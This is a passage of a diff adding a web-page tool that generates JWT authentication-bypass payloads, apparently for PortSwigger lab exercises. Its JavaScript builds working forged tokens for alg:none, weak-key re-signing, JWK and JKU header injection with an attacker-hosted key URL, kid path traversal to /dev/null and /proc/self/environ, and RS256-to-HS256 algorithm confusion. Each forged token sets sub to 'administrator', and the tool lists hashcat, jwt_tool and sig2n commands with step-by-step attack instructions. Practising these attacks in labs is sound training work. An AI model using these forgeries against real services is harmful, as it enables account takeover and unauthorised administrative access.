+                ]
+            },
+            {
+                id: 'alg_none',
+                num: '02',
+                title: 'Flawed Signature Verification (alg: none)',
+                subtitle: 'JWT authentication bypass via flawed signature verification',
+                difficulty: 'apprentice',
+                status: 'solved',
+                algo: 'none',
+                desc: 'Set algorithm to "none" and remove signature. Bypasses servers that accept unsecured JWTs.',
+                fields: [
+                    { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
+                    { id: 'alg_variant', label: 'Algorithm Variant', type: 'select', options: ['none', 'None', 'NONE', 'nOnE', 'noNe'], hint: 'Try different casing to bypass string filters' },
+                    { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional extra claims to merge' }
+                ],
+                steps: [
+                    'Decode the JWT and change the "alg" header to "none" (or variant)',
+                    'Modify the payload sub to "administrator"',
+                    'Remove the signature completely (keep trailing dot)',
+                    'The token becomes: header.payload. (empty signature)',
+                    'Send the modified token to bypass authentication'
+                ]
+            },
+            {
+                id: 'weak_key',
+                num: '03',
+                title: 'Weak Signing Key (Brute Force)',
+                subtitle: 'JWT authentication bypass via weak signing key',
+                difficulty: 'practitioner',
+                status: 'solved',
+                algo: 'HS256',
+                desc: 'If HS256 secret is weak, brute-force it with hashcat/jwt_tool, then re-sign a modified token with the known secret.',
+                fields: [
+                    { id: 'secret_key', label: 'Known/Cracked Secret Key', type: 'text', value: 'secret1', hint: 'The secret found via hashcat' },
+                    { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
+                    { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional extra claims to merge' }
+                ],
+                steps: [
+                    'Crack the JWT secret using: hashcat -a 0 -m 16500 <jwt> <wordlist>',
+                    'Or use jwt_tool: jwt_tool <token> -C -d wordlist.txt',
+                    'Once secret is found, modify the payload as needed',
+                    'Re-sign the token with the cracked secret using HS256',
+                    'Send the newly signed token'
+                ]
+            },
+            {
+                id: 'jwk_injection',
+                num: '04',
+                title: 'JWK Header Injection',
+                subtitle: 'JWT authentication bypass via jwk header injection',
+                difficulty: 'practitioner',
+                status: 'unsolved',
+                algo: 'RS256 → Self-signed JWK',
+                desc: 'Generate an RSA key pair, embed the public key as JWK in the header, and sign with the private key. Server uses embedded key to verify.',
+                fields: [
+                    { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
+                    { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional extra claims' }
+                ],
+                steps: [
+                    'Use Burp Suite JWT Editor to generate a new RSA key pair',
+                    'In Burp Repeater, change the "sub" claim to "administrator"',
+                    'Click "Attack" → "Embedded JWK" in JWT Editor',
+                    'Select your generated RSA key — it embeds the public key as jwk in header',
+                    'The token is auto-signed with your private key → Send the request'
+                ]
+            },
+            {
+                id: 'jku_injection',
+                num: '05',
+                title: 'JKU Header Injection',
+                subtitle: 'JWT authentication bypass via jku header injection',
+                difficulty: 'practitioner',
+                status: 'unsolved',
+                algo: 'RS256 → External JWKS',
+                desc: 'Point the jku header to an attacker-controlled JWKS URL. Server fetches your public key and verifies your forged token.',
+                fields: [
+                    { id: 'jku_url', label: 'Attacker JWKS URL', type: 'text', value: 'https://exploit-server.net/.well-known/jwks.json', hint: 'URL where your JWKS is hosted' },
+                    { id: 'kid_value', label: 'Key ID (kid)', type: 'text', value: 'attacker-key', hint: 'Must match the kid in your hosted JWKS' },
+                    { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
+                    { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional extra claims' }
+                ],
+                steps: [
+                    'Generate a new RSA key pair in Burp JWT Editor',
+                    'Right-click the key → Copy Public Key as JWK',
+                    'Host a JWKS file: {"keys": [<your-jwk>]} on exploit server',
+                    'Modify JWT header: add "jku" pointing to your URL, set matching "kid"',
+                    'Change "sub" to "administrator", sign with your private key, and send'
+                ]
+            },
+            {
+                id: 'kid_traversal',
+                num: '06',
+                title: 'KID Path Traversal',
+                subtitle: 'JWT authentication bypass via kid header path traversal',
+                difficulty: 'practitioner',
+                status: 'solved',
+                algo: 'HS256',
+                desc: 'Set kid to point to a predictable file like /dev/null (empty file), then sign with an empty string secret.',
+                fields: [
+                    {
+                        id: 'kid_path', label: 'KID Path', type: 'select', options: [
+                            '../../../../../../../dev/null',
+                            '/dev/null',
+                            '../../../../../../dev/null',
+                            '../../../../../../../proc/self/environ',
+                            '../../../../../../../etc/hostname'
+                        ], hint: 'Path to a predictable file — /dev/null returns empty string'
+                    },
+                    { id: 'signing_secret', label: 'Signing Secret', type: 'text', value: '', hint: 'For /dev/null, use empty string' },
+                    { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
+                    { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional extra claims' }
+                ],
+                steps: [
+                    'Modify the JWT header "kid" to a path traversal: "../../../dev/null"',
+                    'Change "alg" to "HS256" (symmetric signing)',
+                    '/dev/null is an empty file → secret becomes empty string ""',
+                    'Sign the modified token using empty string as HS256 secret',
+                    'Modify "sub" to "administrator" and send the request'
+                ]
+            },
+            {
+                id: 'alg_confusion',
+                num: '07',
+                title: 'Algorithm Confusion',
+                subtitle: 'JWT authentication bypass via algorithm confusion',
+                difficulty: 'expert',
+                status: 'unsolved',
+                algo: 'RS256 → HS256',
+                desc: 'Change algorithm from RS256 to HS256 and sign using the server\'s public key as the HMAC secret. Server misinterprets the key.',
+                fields: [
+                    { id: 'public_key', label: 'Server Public Key (PEM or Base64)', type: 'textarea', value: '', hint: 'Get from /jwks.json' },
+                    { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
+                    { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional extra claims' }
+                ],
+                steps: [
+                    'Obtain the server\'s public key (from /jwks.json, /.well-known/jwks.json)',
+                    'Convert JWK to PEM format using Burp JWT Editor or cyberchef',
+                    'In Burp JWT Editor: New Symmetric Key → paste base64-encoded PEM as "k" value',
+                    'Change JWT "alg" from "RS256" to "HS256"',
+                    'Modify "sub" to "administrator", sign with symmetric key, and send'
+                ]
+            },
+            {
+                id: 'alg_confusion_no_key',
+                num: '08',
+                title: 'Algorithm Confusion (No Exposed Key)',
+                subtitle: 'JWT authentication bypass via algorithm confusion with no exposed key',
+                difficulty: 'expert',
+                status: 'unsolved',
+                algo: 'RS256 → HS256 (derived)',
+                desc: 'When public key is not directly exposed, derive it from two existing signed tokens using mathematical methods (rsa_sign2n tool).',
+                fields: [
+                    { id: 'jwt_token_2', label: 'Second JWT Token', type: 'textarea', value: '', hint: 'A second JWT to derive key' },
+                    { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
+                    { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional extra claims' }
+                ],
+                steps: [
+                    'Collect two valid JWTs signed by the same RS256 key',
+                    'Use rsa_sign2n tool: docker run --rm -it portswigger/sig2n <token1> <token2>',
+                    'The tool derives the server\'s public key and outputs tampered JWTs',
+                    'Try each output JWT to identify the correct public key',
+                    'Once identified, perform algorithm confusion: RS256→HS256 with derived key',
+                    'Modify "sub" to "administrator", sign, and send'
+                ]
+            }
+        ];
+
+        // ========== RENDER ATTACK CARDS ==========
+        let selectedAttack = null;
+
+        function renderCards() {
+            const grid = document.getElementById('attacksGrid');
+            grid.innerHTML = attacks.map(a => `
+            <div class="attack-card" id="card-${a.id}" onclick="selectAttack('${a.id}')">
+                <div class="card-top">
+                    <span class="card-difficulty difficulty-${a.difficulty}">${a.difficulty}</span>
+                    <span class="card-status status-${a.status === 'solved' ? 'solved' : 'unsolved'}">${a.status === 'solved' ? '✅ Solved' : '🔓 Not solved'}</span>
+                </div>
+                <div class="card-number">${a.num}</div>
+                <div class="card-title">${a.subtitle}</div>
+                <div class="card-desc">${a.desc}</div>
+                <span class="card-algo-tag">${a.algo}</span>
+            </div>
+        `).join('');
+        }
+
+        function selectAttack(id) {
+            const attack = attacks.find(a => a.id === id);
+            if (!attack) return;
+
+            // Update selection UI
+            document.querySelectorAll('.attack-card').forEach(c => c.classList.remove('selected'));
+            document.getElementById(`card-${id}`).classList.add('selected');
+            selectedAttack = attack;
+
+            // Build config panel
+            const panel = document.getElementById('configPanel');
+            const configTitle = document.getElementById('configTitle');
+            const configSubtitle = document.getElementById('configSubtitle');
+            const configFields = document.getElementById('configFields');
+
+            configTitle.innerHTML = `⚡ ${attack.title}`;
+            configSubtitle.textContent = attack.desc;
+
+            let fieldsHTML = '';
+            attack.fields.forEach(f => {
+                if (f.type === 'claims_builder') {
+                    fieldsHTML += `
+                        <div class="config-field full-width">
+                            <label>${f.label}</label>
+                            <div class="claims-builder" id="claimsBuilder">
+                                <!-- Rows injected by JS -->
+                            </div>
+                            <button class="add-claim-btn" onclick="addClaimRow()">➕ Add Claim</button>
+                        </div>
+                    `;
+                } else if (f.type === 'select') {
+                    fieldsHTML += `
+                    <div class="config-field">
+                        <label for="cfg-${f.id}">${f.label}</label>
+                        <select id="cfg-${f.id}">
+                            ${f.options.map(o => `<option value="${o}">${o}</option>`).join('')}
+                        </select>
+                        ${f.hint ? `<div class="config-hint">${f.hint}</div>` : ''}
+                    </div>
+                `;
+                } else if (f.type === 'textarea') {
+                    fieldsHTML += `
+                    <div class="config-field full-width">
+                        <label for="cfg-${f.id}">${f.label}</label>
+                        <textarea id="cfg-${f.id}" placeholder="${f.hint || ''}">${f.value || ''}</textarea>
+                        ${f.hint ? `<div class="config-hint">${f.hint}</div>` : ''}
+                    </div>
+                `;
+                } else {
+                    fieldsHTML += `
+                    <div class="config-field">
+                        <label for="cfg-${f.id}">${f.label}</label>
+                        <input type="text" id="cfg-${f.id}" value="${f.value || ''}" placeholder="${f.hint || ''}">
+                        ${f.hint ? `<div class="config-hint">${f.hint}</div>` : ''}
+                    </div>
+                `;
+                }
+            });
+            configFields.innerHTML = fieldsHTML;
+
+            // Add initial sub: administrator claim by default
+            if (attack.fields.some(f => f.type === 'claims_builder')) {
+                addClaimRow('sub', 'administrator');
+            }
+            panel.classList.add('visible');
+
+            // Hide output
+            document.getElementById('outputSection').classList.remove('visible');
+
+            // Scroll to config
+            panel.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        // ========== JWT INPUT HANDLER ==========
+        document.getElementById('jwtInput').addEventListener('input', function () {
+            const token = this.value.trim();
+            const decoded = decodeJWT(token);
+            const container = document.getElementById('decodedContainer');
+
+            if (decoded) {
+                document.getElementById('decodedHeader').textContent = JSON.stringify(decoded.header, null, 2);
+                document.getElementById('decodedPayload').textContent = JSON.stringify(decoded.payload, null, 2);
+                container.classList.add('visible');
+            } else {
+                container.classList.remove('visible');
+            }
+        });
+
+        // ========== LOAD SAMPLE ==========
+        function loadSample() {
+            const sample = 'eyJraWQiOiIyYjZjNWQ2OC1jNTNjLTQyN2MtOGRjMy05ZGZjODc5OTBhN2MiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3NjAxMjQ4Miwic3ViIjoid2llbmVyIn0._XroJRk2_AWF59ysJ6hz5Th_yPgGloleaOebuasjeg4';
+            const input = document.getElementById('jwtInput');
+            input.value = sample;
+            // Trigger input event to update decode display
+            input.dispatchEvent(new Event('input'));
+            showToast('✅ Sample JWT loaded!');
+        }
+
+        // ========== CLAIM BUILDER HELPERS ==========
+        const commonClaims = ['sub', 'role', 'isAdmin', 'exp', 'iat', 'iss', 'aud', 'nbf', 'jti', 'user_id', 'username', 'email', 'custom...'];
+
+        function addClaimRow(defaultKey = 'sub', defaultValue = '') {
+            const builder = document.getElementById('claimsBuilder');
+            if (!builder) return;
+
+            const row = document.createElement('div');
+            row.className = 'claim-row';
+
+            let selectHTML = `<div class="claim-key-container">
+                <select class="claim-key-select" onchange="handleClaimKeyChange(this)">`;
+            commonClaims.forEach(c => {
+                selectHTML += `<option value="${c}" ${c === defaultKey ? 'selected' : ''}>${c}</option>`;
+            });
+            selectHTML += `</select>
+                <input type="text" class="claim-key-custom" placeholder="Key..." onblur="handleCustomKeyBlur(this)">
+            </div>`;
+
+            row.innerHTML = `
+                ${selectHTML}
+                <input type="text" class="claim-val-input" value="${defaultValue}" placeholder="Value">
+                <button class="remove-claim-btn" onclick="this.parentElement.remove()">✕</button>
+            `;
+
+            builder.appendChild(row);
+        }
+
+        function handleClaimKeyChange(select) {
+            if (select.value === 'custom...') {
+                const container = select.parentElement;
+                const customInput = container.querySelector('.claim-key-custom');
+                select.style.display = 'none';
+                customInput.style.display = 'block';
+                customInput.focus();
+            }
+        }
+
+        function handleCustomKeyBlur(input) {
+            if (!input.value.trim()) {
+                const container = input.parentElement;
+                const select = container.querySelector('.claim-key-select');
+                input.style.display = 'none';
+                select.style.display = 'block';
+                select.value = 'sub';
+            }
+        }
+
+        // ========== GENERATE PAYLOAD ==========
+        async function generatePayload() {
+            const token = document.getElementById('jwtInput').value.trim();
+            if (!token) {
+                showToast('⚠️ Please paste a JWT token first!', true);
+                return;
+            }
+            if (!selectedAttack) {
+                showToast('⚠️ Please select an attack vector!', true);
+                return;
+            }
+
+            const decoded = decodeJWT(token);
+            if (!decoded) {
+                showToast('⚠️ Invalid JWT token!', true);
+                return;
+            }
+
+            let resultToken = '';
+            let modifiedHeader = { ...decoded.header };
+            let modifiedPayload = { ...decoded.payload };
+            let notes = [];
+
+            // Get common field values
+            const getVal = (id) => {
+                const el = document.getElementById(`cfg-${id}`);
+                return el ? el.value : '';
+            };
+
+            // Merge dynamic claims
+            const mergeDynamicClaims = () => {
+                const builder = document.getElementById('claimsBuilder');
+                if (!builder) return;
+                const rows = builder.querySelectorAll('.claim-row');
+                rows.forEach(row => {
+                    const select = row.querySelector('.claim-key-select');
+                    const customInput = row.querySelector('.claim-key-custom');
+
+                    let key = select.style.display === 'none' ? customInput.value.trim() : select.value;
+                    let val = row.querySelector('.claim-val-input').value;
+
+                    // Smart type conversion
+                    if (val.toLowerCase() === 'true') val = true;
+                    else if (val.toLowerCase() === 'false') val = false;
+                    else if (!isNaN(val) && val.trim() !== '') val = Number(val);
+
+                    if (key && key !== 'custom...') {
+                        modifiedPayload[key] = val;
+                    }
+                });
+            };
+
+            // Merge custom claims override
+            const mergeCustomClaims = () => {
+                const custom = getVal('custom_claims');
+                if (custom && custom.trim()) {
+                    try {
+                        const extra = JSON.parse(custom);
+                        modifiedPayload = { ...modifiedPayload, ...extra };
+                    } catch (e) {
+                        notes.push('⚠️ Raw Override JSON was invalid and skipped');
+                    }
+                }
+            };
+
+            // Attack Logic Wrappers
+            const applyPayloadChanges = () => {
+                mergeDynamicClaims();
+                mergeCustomClaims();
+            };
+
+            switch (selectedAttack.id) {
+                case 'unverified_sig': {
+                    applyPayloadChanges();
+                    const newPayloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
+                    resultToken = `${decoded.raw.header}.${newPayloadB64}.${decoded.raw.signature}`;
+                    notes.push('Payload modified, original signature kept unchanged');
+                    break;
+                }
+
+                case 'alg_none': {
+                    const algVariant = getVal('alg_variant') || 'none';
+                    modifiedHeader.alg = algVariant;
+                    delete modifiedHeader.kid;
+                    applyPayloadChanges();
+                    const headerB64 = base64UrlEncode(JSON.stringify(modifiedHeader));
+                    const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
+                    resultToken = `${headerB64}.${payloadB64}.`;
+                    notes.push(`Algorithm set to "${algVariant}", signature removed`);
+                    break;
+                }
+
+                case 'weak_key': {
+                    const secret = getVal('secret_key');
+                    if (!secret && secret !== '') {
+                        showToast('⚠️ Please provide the cracked secret key!', true);
+                        return;
+                    }
+                    modifiedHeader.alg = 'HS256';
+                    applyPayloadChanges();
+                    const headerB64 = base64UrlEncode(JSON.stringify(modifiedHeader));
+                    const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
+                    const sigInput = `${headerB64}.${payloadB64}`;
+                    const signature = await hmacSha256Sign(sigInput, secret);
+                    resultToken = `${headerB64}.${payloadB64}.${signature}`;
+                    notes.push(`Token re-signed with HS256 using secret: "${secret}"`);
+                    break;
+                }
+
+                case 'jwk_injection': {
+                    applyPayloadChanges();
+                    // Generate a note about using Burp Suite
+                    const headerB64 = base64UrlEncode(JSON.stringify({
+                        ...modifiedHeader,
+                        alg: 'RS256',
+                        jwk: {
+                            kty: 'RSA',
+                            e: 'AQAB',
+                            kid: modifiedHeader.kid || 'generated-key',
+                            n: '<YOUR_RSA_PUBLIC_KEY_MODULUS>'
+                        }
+                    }));
+                    const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
+                    resultToken = `${headerB64}.${payloadB64}.<SIGN_WITH_YOUR_RSA_PRIVATE_KEY>`;
+                    notes.push('⚠️ This attack requires Burp Suite JWT Editor to generate RSA keys and sign');
+                    notes.push('Use "Attack → Embedded JWK" in Burp Repeater after generating RSA key');
+                    break;
+                }
+
+                case 'jku_injection': {
+                    const jkuUrl = getVal('jku_url');
+                    const kidVal = getVal('kid_value');
+                    applyPayloadChanges();
+                    modifiedHeader.alg = 'RS256';
+                    modifiedHeader.jku = jkuUrl;
+                    modifiedHeader.kid = kidVal;
+                    const headerB64 = base64UrlEncode(JSON.stringify(modifiedHeader));
+                    const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
+                    resultToken = `${headerB64}.${payloadB64}.<SIGN_WITH_YOUR_RSA_PRIVATE_KEY>`;
+                    notes.push('⚠️ You must host a JWKS file at the jku URL with matching kid');
+                    notes.push('Sign the token with the private key matching the hosted public key');
+                    notes.push(`JWKS URL: ${jkuUrl}`);
+                    break;
+                }
+
+                case 'kid_traversal': {
+                    const kidPath = getVal('kid_path');
+                    const secret = getVal('signing_secret');
+                    modifiedHeader.alg = 'HS256';
+                    modifiedHeader.kid = kidPath;
+                    applyPayloadChanges();
+                    const headerB64 = base64UrlEncode(JSON.stringify(modifiedHeader));
+                    const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
+                    const sigInput = `${headerB64}.${payloadB64}`;
+                    const signature = await hmacSha256Sign(sigInput, secret);
+                    resultToken = `${headerB64}.${payloadB64}.${signature}`;
+                    const secretDisplay = secret === '' ? '(empty string "")' : `"${secret}"`;
+                    notes.push(`KID set to: ${kidPath}`);
+                    notes.push(`Signed with HS256 using secret: ${secretDisplay}`);
+                    break;
+                }
+
+                case 'alg_confusion': {
+                    const publicKey = getVal('public_key');
+                    applyPayloadChanges();
+                    modifiedHeader.alg = 'HS256';
+                    delete modifiedHeader.kid;
+
+                    if (publicKey.trim()) {
+                        const headerB64 = base64UrlEncode(JSON.stringify(modifiedHeader));
+                        const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
+                        const sigInput = `${headerB64}.${payloadB64}`;
+                        // For algorithm confusion, sign with the public key as HMAC secret
+                        const signature = await hmacSha256Sign(sigInput, publicKey.trim());
+                        resultToken = `${headerB64}.${payloadB64}.${signature}`;
+                        notes.push('Algorithm changed from RS256 → HS256');
+                        notes.push('Signed using server public key as HMAC secret');
+                    } else {
+                        const headerB64 = base64UrlEncode(JSON.stringify(modifiedHeader));
+                        const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
+                        resultToken = `${headerB64}.${payloadB64}.<SIGN_WITH_PUBLIC_KEY_AS_HS256_SECRET>`;
+                        notes.push('⚠️ Paste the server public key to generate a signed token');
+                        notes.push('Use Burp JWT Editor: New Symmetric Key → Base64-encode PEM → set as "k"');
+                    }
+                    break;
+                }
+
+                case 'alg_confusion_no_key': {
+                    const jwt2 = getVal('jwt_token_2');
+                    applyPayloadChanges();
+                    modifiedHeader.alg = 'HS256';
+                    const headerB64 = base64UrlEncode(JSON.stringify(modifiedHeader));
+                    const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
+
+                    if (jwt2.trim()) {
+                        resultToken = `${headerB64}.${payloadB64}.<USE_DERIVED_KEY_TO_SIGN>`;
+                        notes.push('Step 1: Run rsa_sign2n to derive the public key:');
+                        notes.push(`docker run --rm -it portswigger/sig2n ${token} ${jwt2.trim()}`);
+                        notes.push('Step 2: The tool outputs tampered tokens — try each one');
+                        notes.push('Step 3: Once working key found, use it in Burp JWT Editor as symmetric key');
+                    } else {
+                        resultToken = `${headerB64}.${payloadB64}.<NEED_TWO_TOKENS_TO_DERIVE_KEY>`;
+                        notes.push('⚠️ You need two JWT tokens signed by the same key');
+                        notes.push('Log in twice (or with two different sessions) to get two tokens');
+                        notes.push('Then use rsa_sign2n to derive the public key');
+                    }
+                    break;
+                }
+            }
+
+            // Display output
+            displayOutput(resultToken, modifiedHeader, modifiedPayload, selectedAttack.steps, notes);
+        }
+
+        // ========== DISPLAY OUTPUT ==========
+        function displayOutput(token, header, payload, steps, notes) {
+            const outputSection = document.getElementById('outputSection');
+            const outputToken = document.getElementById('outputToken');
+            const outputDecoded = document.getElementById('outputDecoded');
+            const attackSteps = document.getElementById('attackSteps');
+
+            outputToken.textContent = token;
+
+            outputDecoded.innerHTML = `
+            <div class="output-decoded-box">
+                <div class="output-decoded-label modified">🔧 Modified Header</div>
+                <div class="output-decoded-json">${JSON.stringify(header, null, 2)}</div>
+            </div>
+            <div class="output-decoded-box">
+                <div class="output-decoded-label modified">🔧 Modified Payload</div>
+                <div class="output-decoded-json">${JSON.stringify(payload, null, 2)}</div>
+            </div>
+        `;
+
+            let stepsHTML = `<div class="steps-title">📋 Attack Steps</div>`;
+            steps.forEach((s, i) => {
+                stepsHTML += `<div class="step-item"><span class="step-num">${i + 1}</span><span>${s}</span></div>`;
+            });
+
+            if (notes.length > 0) {
+                stepsHTML += `<div class="info-box"><strong>📝 Notes:</strong><br>`;
+                notes.forEach(n => { stepsHTML += `${n}<br>`; });
+                stepsHTML += `</div>`;
+            }
+
+            attackSteps.innerHTML = stepsHTML;
+
+            outputSection.classList.add('visible');
+            outputSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        // ========== COPY ==========
+        function copyPayload() {
+            const token = document.getElementById('outputToken').textContent;
+            navigator.clipboard.writeText(token).then(() => {
+                showToast('✅ Payload copied to clipboard!');
+                const btn = document.getElementById('copyBtn');
+                btn.classList.add('copied');
+                btn.textContent = '✅ Copied!';
+                setTimeout(() => {
+                    btn.classList.remove('copied');
+                    btn.innerHTML = '📋 Copy Token';
+                }, 2000);
+            });
+        }
+
+        // ========== TOAST ==========
+        function showToast(message, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.background = isError ? 'rgba(239, 68, 68, 0.2)' : 'rgba(34, 197, 94, 0.2)';
+            toast.style.borderColor = isError ? 'rgba(239, 68, 68, 0.3)' : 'rgba(34, 197, 94, 0.3)';
+            toast.style.color = isError ? 'var(--accent-red)' : 'var(--accent-green)';
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // ========== INIT ==========
+        renderCards();
+    </script>
+</body>
+
+</html>
